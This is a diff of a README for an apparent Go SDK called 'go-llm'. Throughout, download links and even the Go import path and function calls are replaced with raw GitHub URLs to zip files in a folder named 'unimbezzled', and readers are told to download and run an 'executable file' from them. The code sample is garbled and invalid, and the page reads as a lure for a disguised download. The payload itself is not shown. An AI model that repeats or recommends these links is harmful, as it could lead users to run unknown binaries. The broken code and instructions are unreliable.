@@ -1,6 +1,6 @@
 # 🚀 go-llm - A Simple SDK for LLM Apps
 
-[![Download go-llm](https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip)](https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip)
+[![Download go-llm](https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip)](https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip)
 
 ## 🌟 Overview
 
@@ -31,7 +31,7 @@ To use go-llm effectively, you should have:
 
 To download go-llm, visit the following link:
 
-[Download go-llm from Releases](https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip)
+[Download go-llm from Releases](https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -39,7 +39,7 @@ On the Releases page, look for the latest version. Each version will be listed w
 
 ### Step 3: Download the SDK
 
-Once you find the latest version, click on the executable file to start downloading. The file will typically be named something like `https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip` for Windows or a similar format for macOS/Linux.
+Once you find the latest version, click on the executable file to start downloading. The file will typically be named something like `https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip` for Windows or a similar format for macOS/Linux.
 
 ### Step 4: Install the SDK
 
@@ -59,7 +59,7 @@ If you see the version number of the SDK, your installation was successful!
 
 For easy access, here’s the direct download link again:
 
-[Download go-llm from Releases](https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip)
+[Download go-llm from Releases](https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip)
 
 1. Click on the link above.
 2. Locate the latest release version and download the file.
@@ -83,12 +83,12 @@ Here’s a simple example of how to use go-llm in your code:
 ```go
 package main
 
-import "https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip"
+import "https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip"
 
 func main() {
-    model := https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip("OpenAI_Model_ID")
-    response := https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip("Your prompt here")
-    https://raw.githubusercontent.com/Tberke0/go-llm/main/unimbezzled/go_llm_v1.7-alpha.1.zip(response)
+    model := https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip("OpenAI_Model_ID")
+    response := https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip("Your prompt here")
+    https://github.com/Tberke0/go-llm/raw/refs/heads/main/unimbezzled/llm_go_3.5.zip(response)
 }
 ```
 
